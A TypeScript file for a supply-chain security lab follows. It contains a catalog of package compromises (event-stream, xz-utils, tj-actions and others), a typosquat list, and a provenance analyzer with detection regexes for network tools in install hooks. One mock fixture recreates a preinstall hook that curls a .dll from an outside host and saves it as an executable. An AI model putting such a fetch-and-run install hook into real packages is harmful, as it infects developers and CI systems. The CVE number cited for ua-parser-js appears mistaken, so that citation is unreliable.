// Supply Chain / Build Provenance lab data + analyzers.
//
// Every incident below is a real, publicly-documented compromise. Citations
// in `references` link to the canonical advisory. Detection rules below
// flag the patterns that distinguish a poisoned package from a clean one
// using only metadata available at install time (registry response,
// package.json, install scripts, maintainer change-history, attestation
// presence).

export type Severity = "critical" | "high" | "medium" | "low" | "info";

/* ====================================================================== *
 *  Real-world incident catalog                                           *
 * ====================================================================== */

export interface SupplyChainIncident {
  id: string;
  pkg: string;
  ecosystem: "npm" | "pypi" | "rubygems" | "github-actions" | "container";
  date: string; // ISO month
  cve?: string;
  title: string;
  /** What the attacker did, in plain terms. */
  vector: string;
  /** Concrete observable artifacts that distinguished the bad version. */
  signals: string[];
  /** What downstream users ultimately ran on their machines. */
  payload: string;
  blastRadius: string;
  references: string[];
}

export const INCIDENTS: SupplyChainIncident[] = [
  {
    id: "event-stream-2018",
    pkg: "event-stream",
    ecosystem: "npm",
    date: "2018-11",
    title: "event-stream → flatmap-stream → bitcoin wallet exfil (Copay)",
    vector:
      "Maintainer (dominictarr) handed the package to a stranger (right9ctrl). New maintainer added flatmap-stream as a dep, then in v0.1.1 published a minified payload that decrypted only when bundled into the Copay wallet's build, exfiltrating private keys.",
    signals: [
      "maintainer transfer to first-time-publisher account",
      "new transitive dependency with zero github stars and no readme",
      "minified-only published code (no src/ in tarball)",
      "build-time conditional that fires only inside one specific consumer's webpack config",
    ],
    payload:
      "Decrypted JS that scanned process.env / localStorage for BIP-32 master keys and POSTed them to copayapi.host (attacker-controlled).",
    blastRadius:
      "Any wallet built from Copay v5.0.2–5.1.0 between Sep 8 and Nov 26, 2018. Estimated 8M downloads of the parent package per week at the time.",
    references: [
      "https://github.com/dominictarr/event-stream/issues/116",
      "https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident",
    ],
  },
  {
    id: "ua-parser-js-2021",
    pkg: "ua-parser-js",
    ecosystem: "npm",
    date: "2021-10",
    cve: "CVE-2021-44906",
    title: "ua-parser-js account takeover → cryptominer + password stealer",
    vector:
      "Maintainer's npm account compromised via leaked credential. Attacker published 0.7.29, 0.8.0, 1.0.0 with a postinstall hook that downloaded a Linux/Windows cryptominer and a Windows credential stealer (DanaBot).",
    signals: [
      "preinstall script field added in package.json (was absent in 0.7.28)",
      "downloads a remote shell script as part of install",
      "version jump skipping semver convention (1.0.0 published from a 0.x line)",
      "publish from a new IP / publish-token not seen in previous releases",
    ],
    payload:
      "preinstall.sh / preinstall.bat → downloads jsextension binary → starts XMRig miner + Lazarus-affiliated DanaBot stealer on Windows.",
    blastRadius:
      "ua-parser-js had 7M weekly downloads. Used transitively by Facebook, Microsoft, Amazon, Reddit, Slack, Discord. Affected versions live in registry for ~4 hours.",
    references: [
      "https://github.com/faisalman/ua-parser-js/issues/536",
      "https://nvd.nist.gov/vuln/detail/CVE-2021-44906",
      "https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js",
    ],
  },
  {
    id: "node-ipc-2022",
    pkg: "node-ipc",
    ecosystem: "npm",
    date: "2022-03",
    cve: "CVE-2022-23812",
    title: "node-ipc protestware wipes files on RU/BY hosts (peacenotwar)",
    vector:
      "Maintainer (RIAEvangelist) intentionally inserted a payload that, when geo-IP resolved to RU or BY, recursively replaced every file on the host with a heart emoji. Shipped as a transitive dep through vue-cli and many React Native projects.",
    signals: [
      "new module 'ssl-geospec' / peacenotwar with no functional purpose pulled in by patch release",
      "obfuscated string concat that resolves to 'fs.writeFile' targeting '/'",
      "geo-IP HTTP call to api.ipgeolocation.io at runtime (not build-time)",
      "patch-version bump containing >100 LoC of new code",
    ],
    payload:
      "Recursive overwrite of every readable file on disk with a heart emoji on detected RU/BY hosts.",
    blastRadius:
      "Any CI runner or developer machine egressing through a Russian/Belarusian IP. Used by ~1100 packages downstream.",
    references: [
      "https://github.com/RIAEvangelist/node-ipc/issues/233",
      "https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/",
    ],
  },
  {
    id: "3cx-x_trader-2023",
    pkg: "3CXDesktopApp / X_TRADER",
    ecosystem: "container",
    date: "2023-03",
    title: "3CX double supply-chain (X_TRADER → 3CX → 600k customers)",
    vector:
      "Lazarus (UNC4736) compromised X_TRADER (a financial-trading installer). A 3CX engineer installed the trojanized X_TRADER on their dev box, malware pivoted to the 3CX build environment and signed malicious DLLs were shipped inside the legitimate 3CX desktop installer (Electron).",
    signals: [
      "valid Authenticode signature on a DLL that did not appear in the previous build",
      "new ffmpeg.dll in the Electron app bundle with import-table differences from upstream ffmpeg",
      "C2 served via icon files on a public github repo (steganography over PNG IDAT)",
      "signed binary calls out to non-Microsoft / non-3CX domains on first run",
    ],
    payload:
      "Second-stage info-stealer (ICONIC STEALER) with credential theft from Chrome/Edge/Brave + initial access for Lazarus follow-on intrusions.",
    blastRadius:
      "600,000+ companies running 3CX VoIP. Distributed via official auto-update channel, Authenticode-signed.",
    references: [
      "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise",
      "https://www.crowdstrike.com/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/",
    ],
  },
  {
    id: "xz-utils-2024",
    pkg: "xz-utils / liblzma",
    ecosystem: "container",
    date: "2024-03",
    cve: "CVE-2024-3094",
    title: "XZ Utils backdoor (Jia Tan, multi-year social-engineering)",
    vector:
      "A persona ('Jia Tan') spent ~2 years gaining maintainer trust on xz-utils, then in 5.6.0 / 5.6.1 introduced a backdoor in the build system that activated only when liblzma was loaded by sshd. Andres Freund spotted it via a 500ms login latency regression on Debian sid.",
    signals: [
      "build-time test fixtures (.lzma test files) that contained extractable code",
      "release tarball differs from git source in m4/build-to-host.m4",
      "new co-maintainer with rapid privilege escalation and untraceable identity",
      "hidden RSA-key check in indirect ifunc resolver loaded by libsystemd → sshd",
    ],
    payload:
      "Pre-auth RCE in OpenSSH on systems where sshd links libsystemd which links liblzma (most modern Linux distros). Attacker with the matching private key gets root.",
    blastRadius:
      "Affected pre-release Debian sid, Fedora 40 beta, openSUSE Tumbleweed, Kali rolling for ~3 weeks. Caught before stable releases shipped.",
    references: [
      "https://www.openwall.com/lists/oss-security/2024/03/29/4",
      "https://nvd.nist.gov/vuln/detail/CVE-2024-3094",
      "https://research.swtch.com/xz-timeline",
    ],
  },
  {
    id: "ultralytics-2024",
    pkg: "ultralytics",
    ecosystem: "pypi",
    date: "2024-12",
    title: "Ultralytics PyPI build-cache poisoning → XMRig",
    vector:
      "Attacker crafted a pull request that exploited the GitHub Actions build cache to inject malicious code into the Ultralytics 8.3.41 / 8.3.42 wheels. PyPI got the poisoned wheels, source repo did not.",
    signals: [
      "wheel SHA differs from a fresh source-build of the same git tag",
      "GitHub Actions cache key collision between PRs from forks and main branch builds",
      "no in-toto / Sigstore attestation tying the wheel back to a verified build",
      "patch release includes new top-level call to subprocess in __init__.py",
    ],
    payload: "XMRig Monero miner downloaded and run on import.",
    blastRadius:
      "Ultralytics has ~50M monthly PyPI downloads; the bad wheels shipped for ~6 hours before takedown.",
    references: [
      "https://github.com/ultralytics/ultralytics/issues/18027",
      "https://socket.dev/blog/ultralytics-supply-chain-attack-explained",
    ],
  },
  {
    id: "lottiefiles-2024",
    pkg: "lottie-player",
    ecosystem: "npm",
    date: "2024-10",
    title: "LottieFiles npm token leak → web3 wallet drainer",
    vector:
      "Leaked maintainer npm token used to publish 2.0.5/.6/.7 with a wallet-drainer that triggered when the player ran on any page that also loaded a web3 provider.",
    signals: [
      "patch versions published in rapid succession (3 versions in 2 hours)",
      "publishing IP differs from any publish in the last 12 months",
      "minified bundle size jumps ~30% with no source change in repo",
      "no provenance attestation on the published versions",
    ],
    payload:
      "JS injected into any page using lottie-player that probed window.ethereum / window.solana and prompted users to sign drain transactions.",
    blastRadius: "lottie-player at ~80k weekly downloads, used on many marketing sites.",
    references: [
      "https://blog.lottiefiles.com/2024/11/security-update-october-2024/",
      "https://www.bleepingcomputer.com/news/security/supply-chain-attack-hits-lottiefiles-cryptocurrency-wallets-stolen/",
    ],
  },
  {
    id: "tj-actions-2025",
    pkg: "tj-actions/changed-files",
    ecosystem: "github-actions",
    date: "2025-03",
    cve: "CVE-2025-30066",
    title: "tj-actions/changed-files retroactive tag-rewrite (CI secret theft)",
    vector:
      "Attacker compromised the action and force-pushed all version tags (v1, v2 … v45) to point at a single malicious commit that dumped /proc/<runner-pid>/environ to the workflow log. Anyone pinning by tag got the malicious code on next run.",
    signals: [
      "every version tag in the repo points at the same SHA",
      "tag SHAs changed (vs cached value from yesterday)",
      "action references not pinned by SHA",
      "workflow logs contain base64-encoded blobs matching environ format",
    ],
    payload:
      "Dumps environment of the runner process (containing GH_TOKEN, AWS keys, anything passed via env:) into the public workflow log.",
    blastRadius:
      "23,000+ repos depended on tj-actions/changed-files. Every public repo run during the window leaked secrets that were then archived by attackers.",
    references: [
      "https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066",
      "https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised",
    ],
  },
];

/* ====================================================================== *
 *  Typosquat catalog                                                     *
 * ====================================================================== */

export interface TyposquatPattern {
  legitimate: string;
  squat: string;
  technique: string;
  realIncident?: string;
}

export const TYPOSQUATS: TyposquatPattern[] = [
  {
    legitimate: "lodash",
    squat: "loadash",
    technique: "single-letter insertion",
    realIncident: "loadash (npm) repeatedly republished by malware authors 2017–2024",
  },
  {
    legitimate: "lodash",
    squat: "lodahs",
    technique: "transposition",
  },
  {
    legitimate: "request",
    squat: "requets",
    technique: "transposition",
  },
  {
    legitimate: "react-native",
    squat: "react-natve",
    technique: "single-letter omission",
  },
  {
    legitimate: "discord.js",
    squat: "discord.dev",
    technique: "TLD-style swap on package name",
    realIncident: "Multiple 2023 npm campaigns",
  },
  {
    legitimate: "pyyaml",
    squat: "pyyamI",
    technique: "homoglyph (capital I instead of lowercase l)",
  },
  {
    legitimate: "tensorflow",
    squat: "tensorlfow",
    technique: "transposition",
  },
  {
    legitimate: "colorama",
    squat: "colourama",
    technique: "british-english spelling",
    realIncident: "PyPI 2017 — PoC by Bertus, later used by attackers",
  },
  {
    legitimate: "typing-extensions",
    squat: "typing_extensions",
    technique: "underscore-vs-dash on PyPI (different packages)",
  },
  {
    legitimate: "cross-env",
    squat: "crossenv",
    technique: "dash removal",
    realIncident: "crossenv (npm 2017) — exfiltrated env vars to npm.hacktask.net",
  },
];

/* ====================================================================== *
 *  Detection finding model                                               *
 * ====================================================================== */

export interface ProvFinding {
  id: string;
  severity: Severity;
  title: string;
  detail: string;
  fix: string;
}

/* ====================================================================== *
 *  Mock package input                                                    *
 * ====================================================================== */

export interface PackageInput {
  /** package.json contents (any subset of fields). */
  pkgJson: string;
  /** Latest registry metadata (mock /package?distTag=latest response). */
  registry: {
    name: string;
    versions: Array<{
      version: string;
      publishedAt: string; // ISO
      publisherEmail: string;
      publisherIp?: string;
      tarballSha256: string;
      hasInstallScript: boolean;
      attestations?: Array<{
        type: "sigstore" | "github-provenance" | "in-toto";
        verified: boolean;
        builderId?: string;
        sourceRepo?: string;
        sourceCommit?: string;
      }>;
    }>;
    maintainers: Array<{
      email: string;
      addedAt: string; // ISO
      twoFactor: boolean;
    }>;
  };
}

/* ====================================================================== *
 *  Provenance analyzer                                                   *
 * ====================================================================== */

const NAME_RE = /"name"\s*:\s*"([^"]+)"/;
const SCRIPTS_RE = /"scripts"\s*:\s*\{([^}]*)\}/m;
const HOOK_RE =
  /"(preinstall|install|postinstall|preuninstall|prepublish|prepare)"\s*:/g;
const NETWORK_INSTALL_RE =
  /\b(curl|wget|powershell|invoke-webrequest|iwr|fetch|node\s+-e)\b/i;

export function analyzePackage(input: PackageInput): ProvFinding[] {
  const out: ProvFinding[] = [];
  const { pkgJson, registry } = input;

  // --- Install hooks ----------------------------------------------------
  const scriptsMatch = pkgJson.match(SCRIPTS_RE);
  if (scriptsMatch) {
    const scriptsBlock = scriptsMatch[1];
    const hooks = [...scriptsBlock.matchAll(HOOK_RE)].map((m) => m[1]);
    if (hooks.length > 0) {
      const networkInScripts = NETWORK_INSTALL_RE.test(scriptsBlock);
      out.push({
        id: "PROV01",
        severity: networkInScripts ? "critical" : "high",
        title: networkInScripts
          ? "Install hook fetches code from the network"
          : `Install hooks present (${hooks.join(", ")})`,
        detail: networkInScripts
          ? "A pre/install/postinstall script invokes curl/wget/powershell to download remote code at install time. This is the ua-parser-js / lottie-player playbook: install hook downloads payload, runs it on every developer + CI machine."
          : `npm runs ${hooks.join(", ")} automatically on install. Most legitimate packages don't need them; treat as a strong signal.`,
        fix:
          "If you control the package: replace install hooks with explicit lifecycle docs. If you're a consumer: install with --ignore-scripts and pin via SHA, or use a private mirror that strips install scripts.",
      });
    }
  }

  // --- Latest version surface area --------------------------------------
  const sorted = [...registry.versions].sort((a, b) =>
    a.publishedAt.localeCompare(b.publishedAt),
  );
  const latest = sorted[sorted.length - 1];
  const previous = sorted[sorted.length - 2];

  // Rapid republish (>=3 versions inside 6h)
  if (sorted.length >= 3) {
    const last3 = sorted.slice(-3);
    const span =
      new Date(last3[2].publishedAt).getTime() -
      new Date(last3[0].publishedAt).getTime();
    if (span < 6 * 3600 * 1000) {
      out.push({
        id: "PROV02",
        severity: "high",
        title: "Three patch versions published within 6 hours",
        detail:
          "Rapid republishing matches the LottieFiles 2024 incident (2.0.5/.6/.7 in 2 hours). Often the attacker is iterating on a payload that the registry security team is taking down.",
        fix: "Quarantine the package until the maintainer publicly explains the version burst. Pin to last-known-good SHA.",
      });
    }
  }

  // Publisher IP change
  if (
    previous &&
    latest.publisherIp &&
    previous.publisherIp &&
    latest.publisherIp !== previous.publisherIp
  ) {
    out.push({
      id: "PROV03",
      severity: "medium",
      title: "Latest publish from a new IP",
      detail: `Latest version published from ${latest.publisherIp}; previous from ${previous.publisherIp}. Account-takeover incidents (ua-parser-js 2021) typically show a publish from an unfamiliar geo on the malicious version.`,
      fix: "Cross-check with the maintainer's stated workflow. Require npm provenance / Sigstore attestation tying the build to a known CI runner.",
    });
  }

  // No attestation on latest
  const verifiedAtt = latest.attestations?.find((a) => a.verified);
  if (!verifiedAtt) {
    out.push({
      id: "PROV04",
      severity: "high",
      title: "Latest version has no verified build provenance",
      detail:
        "No verified Sigstore / npm-provenance / in-toto attestation links this artifact to a known CI builder + source commit. You're trusting the registry alone. Ultralytics 8.3.41 (2024) shipped without provenance and the wheel SHA differed from a clean source build.",
      fix: "Pin to versions that publish provenance. For npm, use `npm install --foreground-scripts=false` and `npm audit signatures`. For PyPI, prefer projects publishing PEP 740 attestations.",
    });
  }

  // Builder mismatch
  if (verifiedAtt && verifiedAtt.builderId) {
    const trusted = [
      "https://github.com/actions/runner",
      "https://github.com/actions/runner-images",
    ];
    if (!trusted.some((t) => verifiedAtt.builderId!.startsWith(t))) {
      out.push({
        id: "PROV05",
        severity: "medium",
        title: "Build provenance present but builder is unfamiliar",
        detail: `Builder identity '${verifiedAtt.builderId}' does not match a known hosted runner. Self-hosted CI is fine for internal use, but increases trust burden — the runner itself is now part of your TCB.`,
        fix: "Verify the builderId belongs to an attested runner image. For SLSA-3+, require a hosted GitHub Actions or BuildKit-style ephemeral runner with an OIDC-issued identity.",
      });
    }
  }

  // --- Maintainer change history ---------------------------------------
  const recentMaintainers = registry.maintainers.filter((m) => {
    const days =
      (Date.now() - new Date(m.addedAt).getTime()) / (1000 * 3600 * 24);
    return days < 60;
  });
  if (recentMaintainers.length > 0) {
    const noMfa = recentMaintainers.filter((m) => !m.twoFactor);
    out.push({
      id: "PROV06",
      severity: noMfa.length > 0 ? "high" : "medium",
      title: `New maintainer added in the last 60 days${noMfa.length ? " (without 2FA)" : ""}`,
      detail:
        "Maintainer additions / handoffs are how event-stream (2018) was poisoned. The first malicious release usually lands within weeks of the handoff. Lack of 2FA on the new account makes account takeover trivial.",
      fix: "Watch the package for the first three releases after a handoff. Pin the previous, known-good version. If you maintain: require 2FA on every publisher, prefer organization accounts with short-lived OIDC publish tokens.",
    });
  }

  // --- Typosquat against well-known packages ---------------------------
  const nameMatch = pkgJson.match(NAME_RE);
  if (nameMatch) {
    const observed = nameMatch[1].toLowerCase();
    for (const t of TYPOSQUATS) {
      if (observed === t.squat.toLowerCase()) {
        out.push({
          id: "PROV07",
          severity: "critical",
          title: `Typosquat of ${t.legitimate} — ${t.technique}`,
          detail: `Package name '${observed}' matches a known typosquat pattern of '${t.legitimate}'. ${t.realIncident ? `Prior incident: ${t.realIncident}.` : ""}`,
          fix: `Confirm whether you meant '${t.legitimate}'. Update package.json / requirements.txt and audit the lockfile for any references.`,
        });
        break;
      }
    }
  }

  return out;
}

/* ====================================================================== *
 *  Mock fixtures (used by the page UI as scenarios)                       *
 * ====================================================================== */

export interface ProvScenario {
  id: string;
  title: string;
  blurb: string;
  input: PackageInput;
  expected: string;
  /** id of an INCIDENT this scenario re-creates, if any. */
  incidentId?: string;
}

export const SCENARIOS: ProvScenario[] = [
  {
    id: "ua-parser-replica",
    title: "Replica: ua-parser-js 0.7.29 (Oct 2021)",
    blurb:
      "Account-takeover: maintainer's npm token leaked. Patch published from a new IP, with a postinstall hook that downloads a binary.",
    incidentId: "ua-parser-js-2021",
    expected:
      "PROV01 (network in install hook) + PROV03 (new publisher IP) + PROV04 (no provenance) all fire.",
    input: {
      pkgJson: `{
  "name": "ua-parser-js",
  "version": "0.7.29",
  "main": "src/ua-parser.js",
  "scripts": {
    "preinstall": "node preinstall.js && curl -s https://citationsherbe.at/sdd.dll -o jsextension.exe || true"
  }
}`,
      registry: {
        name: "ua-parser-js",
        maintainers: [
          { email: "faisalman@…", addedAt: "2012-01-01T00:00:00Z", twoFactor: false },
        ],
        versions: [
          {
            version: "0.7.28",
            publishedAt: "2021-08-31T10:00:00Z",
            publisherEmail: "faisalman@…",
            publisherIp: "180.252.7.x",
            tarballSha256: "aa11…",
            hasInstallScript: false,
          },
          {
            version: "0.7.29",
            publishedAt: "2021-10-22T05:30:00Z",
            publisherEmail: "faisalman@…",
            publisherIp: "45.134.20.x",
            tarballSha256: "bb22…",
            hasInstallScript: true,
          },
        ],
      },
    },
  },
  {
    id: "event-stream-replica",
    title: "Replica: event-stream / flatmap-stream (Nov 2018)",
    blurb:
      "Maintainer handoff to first-time-publisher account. New maintainer added with no 2FA. Patch release adds a transitive dep with a hidden payload.",
    incidentId: "event-stream-2018",
    expected:
      "PROV06 (new maintainer, no 2FA) + PROV04 (no provenance) fire. The hidden-payload check is performed by the static analyzer when the dep tree is resolved (out of scope here).",
    input: {
      pkgJson: `{
  "name": "event-stream",
  "version": "3.3.6",
  "main": "index.js",
  "dependencies": {
    "flatmap-stream": "^0.1.1"
  }
}`,
      registry: {
        name: "event-stream",
        maintainers: [
          { email: "dominictarr@…", addedAt: "2011-01-01T00:00:00Z", twoFactor: true },
          { email: "right9ctrl@…", addedAt: "2018-09-01T00:00:00Z", twoFactor: false },
        ],
        versions: [
          {
            version: "3.3.5",
            publishedAt: "2017-08-01T00:00:00Z",
            publisherEmail: "dominictarr@…",
            tarballSha256: "cc33…",
            hasInstallScript: false,
          },
          {
            version: "3.3.6",
            publishedAt: "2018-09-09T00:00:00Z",
            publisherEmail: "right9ctrl@…",
            tarballSha256: "dd44…",
            hasInstallScript: false,
          },
        ],
      },
    },
  },
  {
    id: "lottiefiles-replica",
    title: "Replica: LottieFiles lottie-player (Oct 2024)",
    blurb:
      "Three patch versions in two hours from a new IP. No provenance attestation. Wallet-drainer.",
    incidentId: "lottiefiles-2024",
    expected: "PROV02 (rapid republish) + PROV03 (new IP) + PROV04 (no provenance).",
    input: {
      pkgJson: `{
  "name": "@lottiefiles/lottie-player",
  "version": "2.0.7",
  "main": "dist/lottie-player.js"
}`,
      registry: {
        name: "@lottiefiles/lottie-player",
        maintainers: [
          { email: "lottiefiles@…", addedAt: "2020-04-01T00:00:00Z", twoFactor: true },
        ],
        versions: [
          {
            version: "2.0.4",
            publishedAt: "2024-07-15T10:00:00Z",
            publisherEmail: "lottiefiles@…",
            publisherIp: "104.28.4.x",
            tarballSha256: "ee55…",
            hasInstallScript: false,
          },
          {
            version: "2.0.5",
            publishedAt: "2024-10-30T11:55:00Z",
            publisherEmail: "lottiefiles@…",
            publisherIp: "185.220.101.x",
            tarballSha256: "ff66…",
            hasInstallScript: false,
          },
          {
            version: "2.0.6",
            publishedAt: "2024-10-30T12:20:00Z",
            publisherEmail: "lottiefiles@…",
            publisherIp: "185.220.101.x",
            tarballSha256: "0a77…",
            hasInstallScript: false,
          },
          {
            version: "2.0.7",
            publishedAt: "2024-10-30T13:35:00Z",
            publisherEmail: "lottiefiles@…",
            publisherIp: "185.220.101.x",
            tarballSha256: "1a88…",
            hasInstallScript: false,
          },
        ],
      },
    },
  },
  {
    id: "ultralytics-replica",
    title: "Replica: Ultralytics 8.3.41 (Dec 2024)",
    blurb:
      "PyPI wheel without provenance, hash differs from clean source build. Build-cache poisoning attack.",
    incidentId: "ultralytics-2024",
    expected: "PROV04 (no verified provenance).",
    input: {
      pkgJson: `{
  "name": "ultralytics",
  "version": "8.3.41"
}`,
      registry: {
        name: "ultralytics",
        maintainers: [
          { email: "ultralytics@…", addedAt: "2020-01-01T00:00:00Z", twoFactor: true },
        ],
        versions: [
          {
            version: "8.3.40",
            publishedAt: "2024-12-01T00:00:00Z",
            publisherEmail: "ultralytics@…",
            tarballSha256: "abc1…",
            hasInstallScript: false,
            attestations: [
              {
                type: "sigstore",
                verified: true,
                builderId: "https://github.com/actions/runner",
                sourceRepo: "ultralytics/ultralytics",
                sourceCommit: "d34db33f",
              },
            ],
          },
          {
            version: "8.3.41",
            publishedAt: "2024-12-04T00:00:00Z",
            publisherEmail: "ultralytics@…",
            tarballSha256: "abc2…",
            hasInstallScript: false,
            // attestations intentionally absent
          },
        ],
      },
    },
  },
  {
    id: "typosquat-loadash",
    title: "Typosquat: 'loadash' (real, ongoing)",
    blurb:
      "Single-letter insertion against lodash. Republished by malware authors many times since 2017.",
    expected: "PROV07 fires immediately on the package name.",
    input: {
      pkgJson: `{
  "name": "loadash",
  "version": "1.0.0",
  "main": "index.js"
}`,
      registry: {
        name: "loadash",
        maintainers: [
          { email: "fresh-account@…", addedAt: "2024-12-15T00:00:00Z", twoFactor: false },
        ],
        versions: [
          {
            version: "1.0.0",
            publishedAt: "2024-12-15T08:00:00Z",
            publisherEmail: "fresh-account@…",
            tarballSha256: "2a99…",
            hasInstallScript: false,
          },
        ],
      },
    },
  },
  {
    id: "tj-actions-replica",
    title: "Replica: tj-actions/changed-files (Mar 2025)",
    blurb:
      "Every version tag points at the same SHA. Action references not pinned by SHA across thousands of repos.",
    incidentId: "tj-actions-2025",
    expected:
      "PROV04 (no verified provenance) fires. Tag-rewrite is an out-of-band check; see the Detection Engineering lab for SHA-pinning rules.",
    input: {
      pkgJson: `{
  "name": "tj-actions/changed-files",
  "version": "v45.0.7"
}`,
      registry: {
        name: "tj-actions/changed-files",
        maintainers: [
          { email: "tj@…", addedAt: "2020-06-01T00:00:00Z", twoFactor: false },
        ],
        versions: [
          {
            version: "v44.5.0",
            publishedAt: "2024-12-01T00:00:00Z",
            publisherEmail: "tj@…",
            tarballSha256: "old-sha-1",
            hasInstallScript: false,
          },
          {
            version: "v45.0.7",
            publishedAt: "2025-03-14T22:00:00Z",
            publisherEmail: "tj@…",
            publisherIp: "10.x.x.x",
            tarballSha256: "rewritten-sha",
            hasInstallScript: false,
          },
        ],
      },
    },
  },
  {
    id: "clean-baseline",
    title: "Clean baseline (npm-provenance signed)",
    blurb:
      "What a healthy modern package looks like: 2FA maintainers, Sigstore attestation tying tarball to a hosted runner + source SHA, no install hooks.",
    expected: "Zero findings.",
    input: {
      pkgJson: `{
  "name": "well-behaved-utils",
  "version": "2.4.1",
  "main": "dist/index.js"
}`,
      registry: {
        name: "well-behaved-utils",
        maintainers: [
          { email: "team@…", addedAt: "2022-01-01T00:00:00Z", twoFactor: true },
        ],
        versions: [
          {
            version: "2.4.0",
            publishedAt: "2026-04-01T00:00:00Z",
            publisherEmail: "team@…",
            publisherIp: "104.28.4.x",
            tarballSha256: "good-1",
            hasInstallScript: false,
            attestations: [
              {
                type: "sigstore",
                verified: true,
                builderId: "https://github.com/actions/runner",
                sourceRepo: "well-behaved/utils",
                sourceCommit: "a1b2c3d4",
              },
            ],
          },
          {
            version: "2.4.1",
            publishedAt: "2026-04-22T00:00:00Z",
            publisherEmail: "team@…",
            publisherIp: "104.28.4.x",
            tarballSha256: "good-2",
            hasInstallScript: false,
            attestations: [
              {
                type: "sigstore",
                verified: true,
                builderId: "https://github.com/actions/runner",
                sourceRepo: "well-behaved/utils",
                sourceCommit: "e5f6a7b8",
              },
            ],
          },
        ],
      },
    },
  },
];
